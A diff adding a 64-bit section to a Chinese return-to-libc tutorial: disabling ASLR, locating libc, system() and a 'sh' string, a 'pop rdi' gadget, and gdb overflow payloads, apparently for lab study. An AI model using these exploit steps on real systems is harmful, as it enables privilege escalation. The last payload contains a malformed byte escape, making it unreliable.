@@ -69,7 +69,7 @@ f7ffc000-f7ffd000 r--p 00021000 fd:00 34036408                           /usr/li
 f7ffd000-f7ffe000 rw-p 00022000 fd:00 34036408                           /usr/lib/ld-2.17.so
 fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
 ```
-得到libc基地址位`f7e02000`
+得到libc基地址为`f7e02000`
 
 通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset
 ```shell
@@ -139,3 +139,152 @@ int main(int argc, char* argv[]) {
 - exit()
 
 这样我们就可以获得root权限，这种技术叫做chaining of return-to-libc
+
+
+----
+
+#### 64位版本
+
+代码同上,编译如下
+
+```
+echo 0 > /proc/sys/kernel/randomize_va_space
+gcc -g -fno-stack-protector -o vuln vuln.c
+chmod +x vuln
+```
+
+运行`readelf -l vuln`查看栈空间的权限
+
+```
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     10
+
+```
+
+此时GNU_STACK已经没有了E标志位(执行权限)
+
+#### exp编写过程
+
+查看libc基地址
+
+```
+more /proc/24416/maps
+00400000-00401000 r-xp 00000000 fd:00 34957126                           /root/sploitfun/64/vuln
+00600000-00601000 r--p 00000000 fd:00 34957126                           /root/sploitfun/64/vuln
+00601000-00602000 rw-p 00001000 fd:00 34957126                           /root/sploitfun/64/vuln
+7ffff7a0d000-7ffff7bd0000 r-xp 00000000 fd:00 3001855                    /usr/lib64/libc-2.17.so
+7ffff7bd0000-7ffff7dd0000 ---p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
+7ffff7dd0000-7ffff7dd4000 r--p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
+7ffff7dd4000-7ffff7dd6000 rw-p 001c7000 fd:00 3001855                    /usr/lib64/libc-2.17.so
+7ffff7dd6000-7ffff7ddb000 rw-p 00000000 00:00 0 
+7ffff7ddb000-7ffff7dfd000 r-xp 00000000 fd:00 33560                      /usr/lib64/ld-2.17.so
+7ffff7fea000-7ffff7fed000 rw-p 00000000 00:00 0 
+7ffff7ff9000-7ffff7ffa000 rw-p 00000000 00:00 0 
+7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7ffc000-7ffff7ffd000 r--p 00021000 fd:00 33560                      /usr/lib64/ld-2.17.so
+7ffff7ffd000-7ffff7ffe000 rw-p 00022000 fd:00 33560                      /usr/lib64/ld-2.17.so
+7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+```
+
+得到libc基地址为`7ffff7a0d000`
+
+通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset
+
+```
+readelf -s /usr/lib64/libc-2.17.so | grep system
+   224: 00000000001329b0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   582: 0000000000043270    94 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1346: 0000000000043270    94 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+   481: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS system.c
+   482: 0000000000042da0  1037 FUNC    LOCAL  DEFAULT   13 do_system
+  4383: 00000000001329b0    70 FUNC    LOCAL  DEFAULT   13 __GI_svcerr_systemerr
+  6152: 0000000000043270    94 FUNC    WEAK   DEFAULT   13 system
+  6723: 00000000001329b0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
+  6784: 0000000000043270    94 FUNC    GLOBAL DEFAULT   13 __libc_system
+```
+
+通过`objdump -s /usr/lib64/libc-2.17.so |less`查找sh字符并且以00结尾
+
+```
+ 11e40 6f615f6c 6f776572 5f646967 69747300  oa_lower_digits.
+ 11e50 696e6574 365f6f70 745f6669 6e697368  inet6_opt_finish
+ 11e60 00707468 72656164 5f636f6e 645f696e  .pthread_cond_in
+```
+
+得到sh.位置offset为11e5e,固sh.位置的绝对位置为0x7ffff7a1ee5e‬
+
+64位通过寄存器传递参数,所以不需要叠栈空间,前6个参数通过这几个寄存器来传递RDI, RSI, RDX, RCX, R8,和R9
+.我们需要使用ROP来将参数放到寄存器中
+
+第一个参数需要在RDI中,我们需要一个ROP gadget将'sh'放到RDI中
+
+通过`ROPgadget --binary vuln |less`查找gadget
+
+```
+...skipping...
+0x00000000004006c3 : pop rdi ; ret
+0x00000000004006c1 : pop rsi ; pop r15 ; ret
+```
+
+我们需要在栈空间进行如下构建
+
+```
+ _____________
+|     AAAA    |
+|-------------|
+| ........... |
+|-------------|
+| rerutn addr |pop rdi; ret;
+|-------------|
+|     addr    |pointer to "/bin/sh" gets popped into rdi
+|-------------|
+|     addr    |address of system()
+|-------------|
+|   ........  |
+|_____________|
+```
+
+offset
+
+```
+gdb vuln
+r `python -c 'print "A"*270'`
+```
+
+结果
+
+```
+Stopped reason: SIGSEGV
+0x0000414141414141 in ?? ()
+
+```
+
+现在的问题,`strcpy(buf,argv[1])`面临00截断
+
+```
+0x43270 system		7FFF F7A5 0270
+
+libc 0x7ffff7a0d000
+
+sh 11e5e		7FFF F7A1 EE5E
+
+0x00000000004006c3 : pop rdi ; ret
+
+\xc3\x06\x40\x00\x00\x00\x00\x00
+
+\x5e\xee\xa1\xf7\xff\x7f\x00
+\x70\x0x\xa5\xf7\xff\x7f\x00
+
+r `python -c 'print "A"*270'`
+
+r `python -c 'print "A"*264+"\x43\x43\x43\x43\x43\x43\x00\x00"'`
+
+r `python -c 'print "A"*264+"\xc3\x06\x40\x00\x00\x00\x00\x00"'`
+
+r `python -c 'print "A"*264+"\xc3\x06\x40\x00\x00\x00\x00\x00"+"\x5e\xee\xa1\xf7\xff\x7f\x00\x00"+"\x70\x0x\xa5\xf7\xff\x7f\x00\x00"'`
+
+```
+
+https://blog.techorganic.com/
